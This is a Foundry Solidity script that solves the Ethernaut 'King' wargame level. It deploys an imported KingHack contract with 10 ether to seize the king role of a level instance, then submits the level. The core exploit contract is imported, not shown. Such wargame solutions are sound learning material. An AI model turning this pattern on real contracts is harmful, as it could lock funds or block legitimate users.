// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";
import {KingHack} from "../src/9_King/KingHack.sol";

interface Instance {
    function owner() external view returns (address);

    function prize() external view returns (uint);

    function _king() external view returns (address);
}

contract LevelScript is EthernautScript {
    address level = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);
        vm.deal(player, 100 ether);
        instance = Instance(createLevelInstance(level, 0.02 ether));
        // console.log("player", player);
        // console.log("balance of level", level.balance);
        // console.log("instance._king()", instance._king());
        // console.log("instance.prize()", instance.prize());
        // console.log("-> instance:", address(instance));
    }

    function hack() internal {
        KingHack kingHack = new KingHack{value: 10 ether}(
            payable(address(instance))
        );
        require(
            address(kingHack) == instance._king(),
            "Hack is not the king yet"
        );
    }

    function run() public {
        hack();
        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
// forge script ./script/9_King.s.sol
